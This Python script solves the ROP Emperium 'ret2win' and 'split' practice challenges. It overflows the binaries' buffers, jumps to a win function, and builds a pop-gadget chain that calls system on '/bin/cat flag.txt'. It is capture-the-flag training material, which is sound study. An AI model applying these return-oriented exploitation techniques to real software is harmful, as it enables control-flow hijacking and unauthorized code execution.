#!/usr/bin/env python3
##BEGIN#__________________________>#_|INFO|_#<________________________________##
##                                                           ______ _         ##
## DETAILS:                                                  | ___ (_)        ##
##- FILENAME		ROPEmperium.py                           | |_/ /___  __   ##
##- SCRIPT_ID		0x0000                                   |  __/| \ \/ /   ##
##- AUTHOR			Pixailz                                  | |   | |>  <    ##
##- CREATED			2023−06−12T06:36:17+0100                 \_|   |_/_/\_\   ##
##                                                                            ##
##END#____________________________<#_|INFO|_#>________________________________##

from utils.ak			import Ak, addr_to_str
from utils.log			import log

base_bin = "./bin/ROPEmperium"

def get_path(path):
	return (base_bin + "/" + path)

def	ret2win(path):
	ak = Ak(path = get_path(path))

	ak.find_offset()

	ak.bin.pwn_sym_get("win", "ret2win")

	ak.payload.append(ak.bin.sym["win"])
	ak.pack_payload()

	ak.cheaky.add_sendline(ak.p_payload)
	ak.exec_cheat()

	ak.bin.pro.kill()

def	ret2win_64():
	ret2win("ret2win")

def	ret2win_32():
	ret2win("ret2win32")

def	split(path):
	ak = Ak(path = get_path(path))

	ak.find_offset()

	ak.rop.load_rop(f"pop_{ak.bin.dr}", f"pop {ak.bin.dr}", "ret")
	ak.bin.pwn_sym_get("system", "system")

	CAT_FLAG_PTR = next(ak.bin.lod.search(b"/bin/cat flag.txt"))
	if CAT_FLAG_PTR != 0:
		log.format(f"\"/bin/cat flag.txt\" PTR found at {addr_to_str(CAT_FLAG_PTR)}")
	else:
		log.format("\"/bin/cat flag.txt\" PTR not found")

	ak.payload.append(ak.rop.rop_items[f"pop_{ak.bin.dr}"])
	ak.payload.append(CAT_FLAG_PTR)
	ak.payload.append(ak.bin.sym["system"])
	ak.pack_payload()

	ak.cheaky.add_sendline(ak.p_payload)

	ak.exec_cheat()

	ak.go_interact()

	ak.bin.pro.kill()

def	split_64():
	split("split")

def	split_32():
	split("split32")
